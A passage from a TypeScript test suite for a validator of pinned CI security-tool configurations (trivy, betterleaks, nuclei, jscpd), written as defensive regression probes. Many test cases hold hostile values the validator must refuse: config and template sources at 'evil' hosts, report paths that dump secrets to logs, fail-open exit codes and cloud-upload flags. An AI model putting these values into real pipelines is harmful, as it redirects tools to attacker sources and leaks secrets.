    const keyed = (repo: string, over: Entry = {}) => binEntry(repo, {
      verifiedWith: { kind: 'cosign-key', keyUrl: `https://raw.githubusercontent.com/${repo}/v1.0.0/kubelinter-cosign.pub`, keySha256: SUM, verifiedOn: '2026-10-27', ...over },
    });
    expect(load([keyed('stackrox/kube-linter')])[0]?.verifiedWith).toMatchObject({ kind: 'cosign-key' });
    expect(load([keyed('securego/gosec', { keyUrl: 'https://raw.githubusercontent.com/securego/gosec/v1.0.0/cosign.pub' })])).toHaveLength(1);
    rejects([keyed('stackrox/kube-linter', { keyUrl: 'https://raw.githubusercontent.com/evil/keys/v1.0.0/kubelinter-cosign.pub' })], /keyUrl/);
    rejects([keyed('stackrox/kube-linter', { keyUrl: 'https://raw.githubusercontent.com/stackrox/kube-linter/main/kubelinter-cosign.pub' })], /keyUrl/);
    rejects([keyed('stackrox/kube-linter', { keyUrl: 'https://raw.githubusercontent.com/stackrox/kube-linter/v1.0.0/../x.pub' })], /keyUrl/);
    rejects([keyed('stackrox/kube-linter', { keyUrl: 'https://example.com/stackrox/kube-linter/v1.0.0/k.pub' })], /keyUrl/);
    rejects([keyed('stackrox/kube-linter', { keySha256: 'abc' })], /keySha256/);
    rejects([keyed('stackrox/kube-linter', { verifiedOn: '2099-01-01' })], /in the future/);
    rejects([keyed('stackrox/kube-linter', { kind: 'cosign-keys' })]);
    rejects([keyed('stackrox/kube-linter', { identity: 'x' })]); // no mixing of the two shapes
  });

  it('reviewed: scorecard publish_results and dependency-review comment-summary-in-pr fixed', () => {
    const act = (repo: string, key: string, value: string | undefined) => {
      const a = actionEntry({ id: 'x', repo, categories: ['scorecard'] });
      a.step.action.with = value === undefined ? {} : { [key]: value };
      a.fixedInputs = value === undefined ? {} : { with: { [key]: value } };
      a.choices = {};
      return a;
    };
    expect(load([act('ossf/scorecard-action', 'publish_results', 'false')])).toHaveLength(1);
    expect(load([act('actions/dependency-review-action', 'comment-summary-in-pr', 'never')])).toHaveLength(1);
    for (const repo of ['ossf/scorecard-action', 'OSSF/Scorecard-Action']) {
      rejects([act(repo, 'publish_results', 'true')], /publish_results/);
      rejects([act(repo, 'publish_results', undefined)], /publish_results/);
      const stepOnly = act(repo, 'publish_results', 'false');
      stepOnly.fixedInputs = {};
      rejects([stepOnly], /publish_results/); // set, but not fixed: the AI could change it
    }
    for (const repo of ['actions/dependency-review-action', 'Actions/Dependency-Review-Action']) {
      for (const v of ['always', 'on-failure', undefined]) rejects([act(repo, 'comment-summary-in-pr', v)], /comment-summary-in-pr/);
    }
  });

  it('reviewed: pypi-publish never takes a password (trusted publishing only) and fixes attestations "true" (Task 6)', () => {
    const pub = (w: Record<string, string>, choices: Entry = {}) => {
      const a = actionEntry({ id: 'pypi-publish', repo: 'pypa/gh-action-pypi-publish', categories: ['publishing'] });
      a.step.action.with = { ...w };
      a.fixedInputs = { with: { ...w } };
      a.choices = choices;
      return a;
    };
    expect(load([pub({ attestations: 'true' })])).toHaveLength(1);
    rejects([pub({})], /attestations/);
    rejects([pub({ attestations: 'false' })], /attestations/);
    const PW = ['pass', 'word'].join('');
    rejects([pub({ attestations: 'true', [PW]: 'x' })], /password/);
    rejects([pub({ attestations: 'true' }, { [PW]: ['x'] })], /password/);
    rejects([pub({ attestations: 'true' }, { user: ['x'] })], /user/);
  });

  it('reviewed: a pinnedOn in the future is refused (it would void the cooldown, probe #59); a PENDING look-alike is no reviewer (probe #60)', () => {
    const dir = makeTempDir();
    writeIn(dir, 'reviewed-tools.yml', stringify({ pinnedOn: '2099-01-01T00:00:00Z', tools: [cliEntry()] }));
    expect(() => loadReviewed(`${dir}/reviewed-tools.yml`)).toThrow(/pinnedOn is in the future/);
    for (const name of ['PENDlNG', 'PEND1NG', 'Pend ing', 'PENDING.', 'P-E-N-D-I-N-G']) {
      rejects([{ ...actionEntry(), reviewedBy: name, reviewedAt: '2026-11-01' }], /PENDING exactly/);
    }
    expect(load([{ ...actionEntry(), reviewedBy: 'Pendleton Smith', reviewedAt: '2026-11-01' }])).toHaveLength(1);
  });

  it('reviewed: trivy, betterleaks and nuclei take only allowlisted flags, checked on the parsed argv and the fixed args (ruling P13)', () => {
    const grammars: [ReadonlySet<string>, FlagGrammar[]][] = [
      [TRIVY_ALLOWED_FLAGS, Object.values(TRIVY_GRAMMAR)], [BETTERLEAKS_ALLOWED_FLAGS, Object.values(BETTERLEAKS_GRAMMAR)], [NUCLEI_ALLOWED_FLAGS, [NUCLEI_GRAMMAR]],
    ];
    // every allowlisted flag is a real flag of the pinned version (in at least one subcommand)
    for (const [allowed, gs] of grammars) for (const f of allowed) expect(gs.some((g) => g.value.has(f) || g.bool.has(f) || g.optional.has(f)), f).toBe(true);
    // none of the forbidden ones is allowlisted
    for (const f of BETTERLEAKS_FORBIDDEN_FLAGS) expect(BETTERLEAKS_ALLOWED_FLAGS.has(f.replace(/^-+/, ''))).toBe(false);
    const tail = ['--format', 'sarif', '--output', 'tool.sarif', '--exit-code', '1', '.'];
    for (const f of ['--help', '-h', '--version', '-v', '--quiet', '-q', '--debug', '--no-progress', '--skip-db-update', '--list-all-pkgs', '-qv']) {
      rejects([trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, f, ...tail] })], /allowlist, ruling P13/);
    }
    for (const f of ['--help', '-h', '-hv', '--log-level=debug', '--max-target-megabytes=1', '--baseline-path=x', '--enable-rule=x', '-ir', '--no-color']) {
      rejects([betterleaksEntry({ command: blCmd(f, ...(f === '-ir' ? ['x'] : [])) })], /allowlist, ruling P13|never use --verbose/);
    }
    for (const f of ['-version', '-tl', '-h', '-V', '-headless', '-code', '-l', '-o', '-silent', '-stats']) {
      rejects([nucleiEntry({ command: nucleiCmd(f, ...(['-V', '-l', '-o'].includes(f) ? ['x=y'] : [])) })], /allowlist, ruling P13|unknown flag/); // goflags' -h is built in: unknown
    }
    // the fixed args are read with the same grammar
    rejects([betterleaksEntry({ command: blCmd('--no-color'), args: [...BL_ARGS, '--no-color'] })], /allowlist, ruling P13/);
    rejects([trivyEntry({ command: ['trivy', 'image', ...TRIVY_FLAGS, '--no-such', ...tail], args: [...TRIVY_FLAGS, '--no-such'] })], /unknown flag --no-such/);
    // allowlisted flags load (the Task 6 trivy-licence, image and betterleaks shapes)
    expect(load([trivyEntry({ command: ['trivy', 'fs', ...TRIVY_FLAGS, '--scanners', 'license', '--severity', 'HIGH,CRITICAL', '--exit-code', '1', '.'], args: [...TRIVY_FLAGS, '--exit-code', '1'] })])).toHaveLength(1);
    expect(load([betterleaksEntry({ command: blCmd('--no-banner', '--ignore-gitleaks-allow'), args: BL_ARGS })])).toHaveLength(1);
    expect(load([nucleiEntry({ command: nucleiCmd('-u', 'http://localhost:8080', '-ni', '-as') })])).toHaveLength(1);
  });

  it('reviewed: betterleaks --report-path is the output file, never - (findings with secrets to the CI log); --exit-code is a fixed arg (Task 5 carry-forward)', () => {
    // without --exit-code (the cases below add their own); --redact as P21 requires
    const blCmd = (...rest: string[]) => ['betterleaks', 'git', '--redact', '--report-format', 'sarif', '--report-path', 'tool.sarif', ...rest];
    const cmd = (path: string, ...rest: string[]) => ['betterleaks', 'git', '--redact', '--report-format', 'sarif', '--report-path', path, '--exit-code', '1', ...rest];
    for (const path of ['-', '/dev/stdout', '/dev/stderr', '/proc/self/fd/1', 'other.sarif']) {
      rejects([betterleaksEntry({ command: cmd(path) })], /--report-path/);
      rejects([betterleaksEntry({ command: [...blCmd('--exit-code', '1'), `--report-path=${path}`] })], /--report-path/); // a later value wins
      rejects([betterleaksEntry({ command: [...blCmd('--exit-code', '1'), '-r', path] })], /--report-path/);
      rejects([betterleaksEntry({ command: [...blCmd('--exit-code', '1'), '--report-path', path], args: ['--redact', '--report-format', 'sarif', '--exit-code', '1', '--report-path', path] })], /--report-path/);
    }
    const dash = betterleaksEntry({ command: cmd('-') });
    dash.step.output = { path: '-', format: 'sarif' };
    rejects([dash], /--report-path|output path starts with/);
    // --exit-code: set by the template (in the command and the fixed args, same value, not 0), never chosen by the AI
    const fixed = ['--redact', '--report-format', 'sarif', '--exit-code', '1'];
    expect(load([betterleaksEntry({ command: blCmd('--exit-code', '1'), args: fixed })])).toHaveLength(1);
    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1'), args: ['--redact', '--report-format', 'sarif'] })], /--exit-code/); // not a fixed arg
    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1', '--exit-code', '0'), args: fixed })], /--exit-code/);
    rejects([betterleaksEntry({ command: blCmd('--exit-code', '0'), args: ['--redact', '--report-format', 'sarif', '--exit-code', '0'] })], /--exit-code/);
    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1'), args: fixed, choices: { 'exit-code': ['0', '1'] } })], /exit-code/);
    // security scan finding (fail-open): both sources are checked, not only the command
    rejects([betterleaksEntry({ command: [...blCmd(), '--', '--exit-code', '0'], args: ['--redact', '--report-format', 'sarif', '--exit-code', '0'] })], /--exit-code/); // fixed-only 0
    rejects([betterleaksEntry({ command: [...blCmd(), '--', '--exit-code', '1'], args: ['--redact', '--report-format', 'sarif', '--exit-code', '1'] })], /--exit-code/); // fixed-only 1
    rejects([betterleaksEntry({ command: blCmd('--exit-code', '2'), args: ['--redact', '--report-format', 'sarif'] })], /--exit-code/); // command-only
    rejects([betterleaksEntry({ command: blCmd('--exit-code', '1', '--exit-code', '2'), args: ['--redact', '--report-format', 'sarif', '--exit-code', '1'] })], /--exit-code/); // both, different
    for (const zero of ['00', '+0', '0x0', '-0', ' 1', '1 ', '01']) {
      rejects([betterleaksEntry({ command: blCmd('--exit-code', zero), args: ['--redact', '--report-format', 'sarif', '--exit-code', zero] })], /--exit-code/);
      rejects([betterleaksEntry({ command: blCmd(`--exit-code=${zero}`), args: ['--redact', '--report-format', 'sarif', `--exit-code=${zero}`] })], /--exit-code/);
    }
    // ruling P18: exactly 1. 256 and 512 wrap to exit status 0; 2 is refused too (one fixed value)
    for (const code of ['2', '256', '512', '257']) {
      rejects([betterleaksEntry({ command: blCmd('--exit-code', code), args: ['--redact', '--report-format', 'sarif', '--exit-code', code] })], /--exit-code/);
      rejects([betterleaksEntry({ command: blCmd(`--exit-code=${code}`), args: ['--redact', '--report-format', 'sarif', `--exit-code=${code}`] })], /--exit-code/);
    }
    // an earlier 0 overridden by a later 1 is still refused (every value must be 1)
    rejects([betterleaksEntry({ command: blCmd('--exit-code', '0', '--exit-code', '1'), args: ['--redact', '--report-format', 'sarif', '--exit-code', '0', '--exit-code', '1'] })], /--exit-code/);
  });

  it('reviewed: betterleaks --redact takes an optional value, as pflag reads it (NoOptDefVal "100", v1.9.0 cmd/root.go:95)', () => {
    expect(BETTERLEAKS_GRAMMAR.git.optional.has('redact')).toBe(true);
    expect(BETTERLEAKS_GRAMMAR.git.value.has('redact')).toBe(false);
    // alone it doesn't swallow the next word, so a following --config is a second config
    rejects([betterleaksEntry({ command: blCmd('--redact', '--config=/tmp/evil.toml') })], /pinned --config/);
    rejects([betterleaksEntry({ command: blCmd('--redact', '-c/tmp/evil.toml') })], /pinned --config/);
    rejects([betterleaksEntry({ command: blCmd('--redact', '--verbose') })], /never use --verbose/);
    expect(load([betterleaksEntry({ command: blCmd('--redact=100') })])).toHaveLength(1);
    expect(load([betterleaksEntry({ command: blCmd('--redact') })])).toHaveLength(1);
    // P21: never partly redacted, never without --redact
    for (const r of ['--redact=50', '--redact=0']) rejects([betterleaksEntry({ command: blCmd(r) })], /--redact/);
    rejects([betterleaksEntry({ command: blCmd().filter((x) => x !== '--redact'), args: BL_ARGS.filter((x) => x !== '--redact') })], /--redact/);
  });

  it('reviewed: trivy\'s pinned config is YAML with only cache.backend: memory (ruling P13)', () => {
    const conf = (content: string | null, passAs: Entry = { flag: '--config' }) => {
      const e = trivyEntry();
      if (content === null) delete e.fixedInputs.config;
      else e.fixedInputs.config = { content, passAs };
      return e;
    };
    expect(load([conf('# pinned\ncache:\n  backend: memory\n')])).toHaveLength(1);
    for (const extra of ['db:\n  repository: ghcr.io/evil/db\n', 'server:\n  addr: http://x\n', 'misconfiguration:\n  checks-bundle-repository: x\n',
      'disable-telemetry: false\n', 'cache:\n  dir: /tmp\n', 'severity: [LOW]\n']) {
      rejects([conf(`cache:\n  backend: memory\n${extra}`)], /may set only cache.backend: memory|plain YAML/); // a second `cache:` key is invalid YAML
    }
    rejects([conf('cache:\n  backend: fs\n')], /may set only cache.backend: memory, not cache.backend/);
    rejects([conf('cache: &a\n  backend: memory\nother: *a\n')], /plain YAML|may set only/);
    rejects([conf('cache:\n  backend: memory\ncache:\n  backend: memory\n')], /plain YAML/);
    rejects([conf('[1, 2]\n')], /may set only/);
    rejects([conf(null)], /pinned config, passed as --config/);
    rejects([conf('cache:\n  backend: memory\n', { flag: '--secret-config' })], /pinned config, passed as --config/);
    // the real entries load with exactly that
    for (const id of ['trivy-config', 'trivy-image']) expect(byId(real(), id)[0]?.fixedInputs.config?.passAs).toEqual({ flag: '--config' });
  });
});

// ---------- fix round 1: every case of the Task 5 adversarial review (scratchpad adv-p5/probe.mjs), as a regression test ----------

describe('Task 5 review probes (fix round 1)', () => {
  const H = 'b'.repeat(64);
  // verifiedOn on the real list's pin day (the probes mutate the real list, whose pinnedOn moved to pin day in Task 6)
  const vw = (repo: string, ref: string) => ({ method: 'cosign-bundle', asset: 'checksums.txt', identity: `https://github.com/${repo}/.github/workflows/release.yml@${ref}`, issuer: ISSUER, verifiedOn: rawFile().pinnedOn.slice(0, 10) });
  const pcli = (id: string, repo: string, version: string, pkg: string, command: string[], extra: Entry = {}): Entry => ({
    id, categories: ['secrets'], languages: ['any'], releasedAt: '2026-09-29T20:08:06Z',
    candidate: { id, name: repo, kind: 'cli', repo, version, pin: { checksum: H }, source: 'reviewed', reviewed: true, categories: ['secrets'] },
    step: { cli: { install: { method: 'github-release', package: pkg, version }, command }, output: { path: '', format: 'none' } },
    fixedInputs: {}, choices: {}, configFiles: [], reviewedBy: 'PENDING', reviewedAt: 'PENDING', proofs: 0, ...extra,
  });
  const pbetterleaks = () => pcli('betterleaks', 'betterleaks/betterleaks', 'v1.9.0', 'betterleaks_1.9.0_linux_x64.tar.gz', ['betterleaks', 'dir', '--redact', '--report-format', 'sarif', '--report-path', 'b.sarif', '--exit-code', '1', '.'],
    {
      fixedInputs: { args: ['--redact', '--report-format', 'sarif', '--exit-code', '1'], config: { content: '[extend]\nuseDefault = true\n', passAs: { flag: '--config' } } },
      verifiedWith: vw('betterleaks/betterleaks', 'refs/tags/v1.9.0'), step: { cli: { install: { method: 'github-release', package: 'betterleaks_1.9.0_linux_x64.tar.gz', version: 'v1.9.0' }, command: ['betterleaks', 'dir', '--redact', '--report-format', 'sarif', '--report-path', 'b.sarif', '--exit-code', '1', '.'] }, output: { path: 'b.sarif', format: 'sarif' } },
    });
  const PNUC_ENV = { [NUCLEI_URL_ENV]: NUCLEI_URL, [NUCLEI_SUM_ENV]: H };
  const pnuclei = () => {
    const e = pcli('nuclei', 'projectdiscovery/nuclei', 'v3.11.1', 'nuclei_3.11.1_linux_amd64.zip', ['nuclei', '-duc', '-t', NUCLEI_DIR, '-u', 'http://localhost:8080', '-sarif-export', 'n.sarif']);
    e.categories = ['dast'];
    e.candidate.categories = ['dast'];
    e.step.cli.env = { ...PNUC_ENV };
    e.fixedInputs = { args: ['-duc', '-t', NUCLEI_DIR], env: { ...PNUC_ENV } };
    return e;
  };
  // the review's jscpd base used refs/heads/master; branch identities are refused now, so the base is signed at its tag
  const pjscpd = (ref = 'refs/tags/v5.4.2') => {
    const e = pcli('jscpd', 'kucherenko/jscpd', 'v5.4.2', 'jscpd-linux-x64-gnu.tar.gz', ['jscpd', ...JSCPD_ARGS, '.'],
      { fixedInputs: { args: [...JSCPD_ARGS], config: { content: '{}\n', passAs: { flag: '--config' } } }, verifiedWith: vw('kucherenko/jscpd', ref) });
    e.categories = ['duplication'];
    e.candidate.categories = ['duplication'];
    return e;
  };
  const pnpm = () => {
    const e = pcli('biome', 'biomejs/biome', '2.5.15', '@biomejs/biome', ['biome', 'ci', '.']);
    e.candidate.pin = { checksum: SRI };
    e.step.cli.install = { method: 'npm', package: '@biomejs/biome', version: '2.5.15' };
    e.categories = ['lint'];
    e.candidate.categories = ['lint'];
    return e;
  };
  const pplugin = (pkg: string) => ({ method: 'npm', package: pkg, version: '1.0.0', checksum: SRI });
  type Doc = { pinnedOn: string; tools: Entry[] };
  const find = (d: Doc, id: string) => d.tools.find((t) => t.id === id) as Entry;
  const asAction = (d: Doc, repo: string, sub = '') => {
    const e = find(d, 'actions-download-artifact');
    e.candidate.repo = repo;
    e.candidate.name = repo;
    e.step.action.uses = `${repo}${sub}@${e.candidate.pin.sha}`;
  };
  const asImage = (d: Doc, image: string, repo = 'someone/scanner') => {
    const e = find(d, 'registry');
    e.candidate.repo = repo;
    e.candidate.name = repo;
    e.step.cli.install.package = image;
  };
  // the probe's entry replaces a real entry with its id (Task 6 added betterleaks, nuclei, jscpd, biome, … to the real list)
  const put = (d: Doc, e: Entry) => { d.tools = [...d.tools.filter((t) => t.id !== e.id), e]; };
  const add = (e: Entry) => (d: Doc) => { put(d, e); };
  const setEnv = (id: string, k: string, v: string) => (d: Doc) => {
    const e = find(d, id);
    e.step.cli.env = { ...(e.step.cli.env ?? {}), [k]: v };
    e.fixedInputs.env = { ...(e.fixedInputs.env ?? {}), [k]: v };
  };
  const trivy = (d: Doc) => find(d, 'trivy-image');
  const withAdded = (make: () => Entry, change: (e: Entry) => void) => (d: Doc) => {
    const e = make();
    change(e);
    put(d, e);
  };
  const ACCEPT = null;
  // [probe number, name, mutation, null = loads | the refusal it must give]
  const probes: [number, string, (d: Doc) => void, RegExp | null][] = [
    [1, 'control: real file loads', () => {}, ACCEPT],
    [2, 'action aquasecurity/trivy-action', (d) => asAction(d, 'aquasecurity/trivy-action'), NEVER_MSG],
    [3, 'action AquaSecurity/Trivy-Action (case)', (d) => asAction(d, 'AquaSecurity/Trivy-Action'), NEVER_MSG],
    [4, 'uses sub-path reviewdog/action-setup/x', (d) => asAction(d, 'reviewdog/action-setup', '/x'), NEVER_MSG],
    [5, 'look-alike aquasecurity/trivy-actlon', (d) => asAction(d, 'aquasecurity/trivy-actlon'), NEVER_MSG],
    [6, 'image checkmarx/kics', (d) => asImage(d, 'checkmarx/kics'), NEVER_MSG],
    [7, 'env URL .git suffix', setEnv('zizmor', 'X_URL', 'https://github.com/aquasecurity/trivy-action.git'), NEVER_MSG],
    [8, 'env URL fullwidth letters (NFKC)', setEnv('zizmor', 'X_URL', 'https://github.com/ａｑｕａsecurity/trivy-action/archive/v1.tar.gz'), NEVER_MSG],
    [9, 'trivy without --disable-telemetry', (d) => {
      const e = trivy(d);
      e.step.cli.command = e.step.cli.command.filter((a: string) => a !== '--disable-telemetry');
      e.fixedInputs.args = e.fixedInputs.args.filter((a: string) => a !== '--disable-telemetry');
    }, /--disable-telemetry/],
    [10, 'trivy --disable-telemetry=false', (d) => { trivy(d).step.cli.command.push('--disable-telemetry=false'); }, /--disable-telemetry/],
    [11, 'trivy without verifiedWith', (d) => { delete trivy(d).verifiedWith; }, /verifiedWith is required/],
    [12, 'control: betterleaks base entry valid', add(pbetterleaks()), ACCEPT],
    [13, 'betterleaks --validate', withAdded(pbetterleaks, (e) => e.step.cli.command.push('--validate')), /never use --validate/],
    [14, 'control: nuclei base entry valid', add(pnuclei()), ACCEPT],
    [15, 'nuclei -dashboard', withAdded(pnuclei, (e) => e.step.cli.command.push('-dashboard')), /never upload/],
    [16, 'jscpd base entry signed on a branch (refs/heads/master): refused now', add(pjscpd('refs/heads/master')), /never a regex, a branch or a commit/],
    [16, 'control: jscpd base entry signed at its tag', add(pjscpd()), ACCEPT],
    [17, 'jscpd --semantic', withAdded(pjscpd, (e) => e.step.cli.command.push('--semantic')), /--semantic/],
    [18, 'npm plugin eslint-config-prettier', withAdded(pnpm, (e) => { e.step.cli.plugins = [pplugin('eslint-config-prettier')]; }), /eslint-config-prettier/],
    [19, 'verifiedWith identity with regex chars', (d) => { trivy(d).verifiedWith.identity = 'https://github.com/aquasecurity/trivy/.github/workflows/.*@refs/tags/v0.76.0'; }, /identity/],
    [20, 'releasedAt inside cooldown', (d) => { trivy(d).releasedAt = '2026-10-25T00:00:00Z'; }, /cooldown/],
    [21, 'fork with same name: dajiaohuang/trivy-action', (d) => asAction(d, 'dajiaohuang/trivy-action'), NEVER_MSG],
    [22, 'fork with same name: someone/kics-github-action', (d) => asAction(d, 'someone/kics-github-action'), NEVER_MSG],
    [23, 'fork with same name: someone/setup-trivy', (d) => asAction(d, 'someone/setup-trivy'), NEVER_MSG],
    [24, 'sibling repo: slsa-framework/slsa-github-generator-go', (d) => asAction(d, 'slsa-framework/slsa-github-generator-go'), NEVER_MSG],
    [25, 'image aquasec/tfsec', (d) => asImage(d, 'aquasec/tfsec'), NEVER_MSG],
    [26, 'image aquasec/tfsec-ci', (d) => asImage(d, 'aquasec/tfsec-ci'), NEVER_MSG],
    [27, 'image aquasec/trivy', (d) => asImage(d, 'aquasec/trivy'), NEVER_MSG],
    [28, 'docker entry aquasec/trivy with flags + verifiedWith', (d) => {
      const e = find(d, 'registry');
      const t = trivy(d);
      e.candidate.repo = 'aquasecurity/trivy';
      e.candidate.name = 'aquasecurity/trivy';
      e.step.cli.install.package = 'aquasec/trivy';
      e.step.cli.command = [...t.step.cli.command];
      e.fixedInputs = { args: [...t.fixedInputs.args] };
      e.verifiedWith = { ...t.verifiedWith, identity: t.verifiedWith.identity.replace('v0.76.0', '2.8.3') };
    }, NEVER_MSG],
    [29, 'image ghcr.io/aquasecurity/trivy', (d) => asImage(d, 'ghcr.io/aquasecurity/trivy'), NEVER_MSG],
    [30, 'env URL %-encoded trivy%2Daction', setEnv('zizmor', 'X_URL', 'https://github.com/aquasecurity/trivy%2Daction/archive/refs/tags/v0.28.0.tar.gz'), NEVER_MSG],
    [31, 'env URL dot segment /x/../aquasecurity/trivy-action', setEnv('zizmor', 'X_URL', 'https://github.com/x/../aquasecurity/trivy-action/archive/refs/tags/v0.28.0.tar.gz'), NEVER_MSG],
    [32, 'env URL by numeric repo id', setEnv('zizmor', 'X_URL', 'https://api.github.com/repositories/268833180/tarball/v0.28.0'), /repo by id/],
    [33, 'config text glued x:aquasecurity/trivy-action@v1', (d) => { find(d, 'trivy-config').fixedInputs.config.content += 'x:aquasecurity/trivy-action@v1\n'; }, NEVER_MSG],
    [34, 'scoped token @reviewdog/action-setup in an arg', (d) => { trivy(d).step.cli.command.push('@reviewdog/action-setup'); }, NEVER_MSG],
    [35, 'npm plugin @reviewdog/reviewdog (scoped)', withAdded(pnpm, (e) => { e.step.cli.plugins = [pplugin('@reviewdog/reviewdog')]; }), NEVER_MSG],
    [36, 'trivy: --template swallows --disable-telemetry', (d) => {
      trivy(d).step.cli.command = ['trivy', 'image', '--template', '--disable-telemetry', '--skip-version-check', '--skip-check-update', '--format', 'sarif', '--output', 'trivy-image.sarif', '--exit-code', '1'];
    }, /--disable-telemetry in effect/],
    [37, 'trivy: flags only after --', (d) => {
      const e = trivy(d);
      e.step.cli.command = ['trivy', 'image', '--format', 'sarif', '--output', 'trivy-image.sarif', '--exit-code', '1', '--', '--disable-telemetry', '--skip-version-check', '--skip-check-update'];
      e.fixedInputs.args = ['--format', 'sarif', '--disable-telemetry', '--skip-version-check', '--skip-check-update'];
    }, /in effect/],
    [38, 'trivy: env TRIVY_DISABLE_TELEMETRY=false', setEnv('trivy-image', 'TRIVY_DISABLE_' + 'TELEMETRY', 'false'), /TRIVY_/],
    [39, 'trivy: choice value --disable-telemetry=false', (d) => { trivy(d).choices.severity.push('--disable-telemetry=false'); }, /choice value may not be a flag/],
    [40, 'MUST_VERIFY: trivy under repo aquasec/trivy, no verifiedWith', (d) => {
      const e = trivy(d);
      e.candidate.repo = 'aquasec/trivy';
      delete e.verifiedWith;
    }, /verifiedWith is required/],
    [41, 'MUST_VERIFY: betterleaks fork someone/betterleaks, no verifiedWith', withAdded(pbetterleaks, (e) => {
      e.candidate.repo = 'someone/betterleaks';
      delete e.verifiedWith;
    }), /verifiedWith is required/],
    [42, 'jscpd: config JSON escape "\\u0073emantic"', withAdded(pjscpd, (e) => { e.fixedInputs.config.content = '{"\\u0073emantic": {"enabled": true}}\n'; }), /semantic/],
    [43, 'jscpd: --compare', withAdded(pjscpd, (e) => e.step.cli.command.push('--compare')), /--compare/],
    [44, 'jscpd renamed: someone/cpd running cpd --semantic', withAdded(pjscpd, (e) => {
      e.step.cli.command = ['cpd', '--semantic', '.'];
      e.candidate.repo = 'someone/cpd';
      e.step.cli.install.package = 'cpd-linux.tar.gz';
      delete e.verifiedWith;
    }), /--semantic/],
    [45, 'betterleaks v1.9.0 --validation', withAdded(pbetterleaks, (e) => e.step.cli.command.push('--validation')), /never use --validation/],
    [46, 'betterleaks v1.9.0 validate subcommand', withAdded(pbetterleaks, (e) => e.step.cli.command.splice(1, 1, 'validate')), /never run validate/],
    [47, 'betterleaks --validation-env-vars GITHUB_TOKEN', withAdded(pbetterleaks, (e) => e.step.cli.command.push('--validation-env-vars', 'GITHUB_TOKEN')), /never use --validation-env-vars/],
    [48, 'betterleaks (main) -a shorthand', withAdded(pbetterleaks, (e) => e.step.cli.command.push('-a')), /never use -a/],
    [49, 'nuclei: -cup', withAdded(pnuclei, (e) => e.step.cli.command.push('-cup')), /never upload/],
    [50, 'nuclei: env ENABLE_CLOUD_UPLOAD=true', withAdded(pnuclei, (e) => {
      e.step.cli.env.ENABLE_CLOUD_UPLOAD = 'true';
      e.fixedInputs.env.ENABLE_CLOUD_UPLOAD = 'true';
    }), /not ENABLE_CLOUD_UPLOAD/],
    [51, 'nuclei: -ai prompt', withAdded(pnuclei, (e) => e.step.cli.command.push('-ai', 'find sqli')), /pinned archive/],
    [52, 'nuclei: -config file', withAdded(pnuclei, (e) => e.step.cli.command.push('-config', 'nuclei.yaml')), /pinned archive/],
    [53, 'nuclei: -o swallows -duc', withAdded(pnuclei, (e) => { e.step.cli.command = ['nuclei', '-o', '-duc', '-t', NUCLEI_DIR, '-u', 'http://localhost:8080']; }), /-duc \(no update check\) in effect/],
    [54, 'nuclei: GITHUB_TEMPLATE_REPO env', withAdded(pnuclei, (e) => {
      e.step.cli.env.GITHUB_TEMPLATE_REPO = 'evil/templates';
      e.fixedInputs.env.GITHUB_TEMPLATE_REPO = 'evil/templates';
    }), /not GITHUB_TEMPLATE_REPO/],
    [55, 'verifiedWith identity of another repo', (d) => { trivy(d).verifiedWith.identity = 'https://github.com/evil/evil/.github/workflows/release.yml@refs/tags/v0.76.0'; }, /workflow of evil\/evil/],
    [56, 'verifiedWith identity on a branch named like the tag', (d) => { trivy(d).verifiedWith.identity = 'https://github.com/aquasecurity/trivy/.github/workflows/reusable-release.yaml@refs/heads/v0.76.0'; }, /a branch or a commit/],
    [57, 'verifiedWith asset of another version', (d) => { trivy(d).verifiedWith.asset = 'trivy_0.75.0_checksums.txt'; }, /file of version 0\.75\.0/],
    [58, 'verifiedWith verifiedOn in the future', (d) => { trivy(d).verifiedWith.verifiedOn = '2099-01-01'; }, /in the future/],
    [59, 'pinnedOn in the future: cooldown void', (d) => {
      d.pinnedOn = '2099-01-01T00:00:00Z';
      trivy(d).releasedAt = '2026-10-27T00:00:00Z';
    }, /pinnedOn is in the future/],
    [60, 'reviewedBy look-alike PENDlNG', (d) => {
      const e = trivy(d);
      e.reviewedBy = 'PENDlNG';
      e.reviewedAt = '2026-10-27';
    }, /PENDING exactly/],
  ];
  // fix round 2: every case of the re-review's parser probes (scratchpad adv-p5/probe-r1.mjs); null = loads
  const ALLOW = /allowlist, ruling P13/;
  const blAt = (...words: string[]) => withAdded(pbetterleaks, (e) => e.step.cli.command.splice(2, 0, ...words));
  const nucAt = (...words: string[]) => withAdded(pnuclei, (e) => e.step.cli.command.push(...words));
  const trivyConf = (id: string, more: string) => (d: Doc) => { find(d, id).fixedInputs.config.content += more; };
  const probesR1: [number, string, (d: Doc) => void, RegExp | null][] = [
    [1, 'control: real file loads', () => {}, ACCEPT],
    [2, 'control: betterleaks base', add(pbetterleaks()), ACCEPT],
    [3, 'control: nuclei base', add(pnuclei()), ACCEPT],
    [4, 'control: jscpd base signed at its tag', add(pjscpd()), ACCEPT],
    [5, 'jscpd \\u0073emantic config', withAdded(pjscpd, (e) => { e.fixedInputs.config.content = '{"\\u0073emantic": {"enabled": true}}\n'; }), /semantic/],
    [6, 'jscpd --compare', withAdded(pjscpd, (e) => e.step.cli.command.push('--compare')), /--compare/],
    [7, 'future pinnedOn alone', (d) => { d.pinnedOn = '2099-01-01T00:00:00Z'; }, /pinnedOn is in the future/],
    [8, 'betterleaks -vfsarif bundles --verbose', blAt('-vfsarif'), /never use --verbose \(given as -vfsarif/],
    [9, 'betterleaks -hv (help + verbose)', blAt('-hv'), /never use --verbose|allowlist/],
    [10, 'betterleaks --redact then --config=/x (optional value: nothing swallowed)', blAt('--redact', '--config=/tmp/evil.toml'), /pinned --config/],
    [11, 'betterleaks --redact then -c/x', blAt('--redact', '-c/tmp/evil.toml'), /pinned --config/],
    [12, 'betterleaks --verbose=true', withAdded(pbetterleaks, (e) => e.step.cli.command.push('--verbose=true')), /never use --verbose/],
    [13, 'betterleaks -dr=x (expanded to --disable-rule: not allowlisted)', blAt('-dr=generic-api-key'), ALLOW],
    [14, 'betterleaks --help', withAdded(pbetterleaks, (e) => e.step.cli.command.push('--help')), ALLOW],
    [15, 'trivy -qv (quiet + version)', (d) => { trivy(d).step.cli.command.splice(2, 0, '-qv'); }, ALLOW],
    [16, 'trivy --help', (d) => { trivy(d).step.cli.command.push('--help'); }, ALLOW],
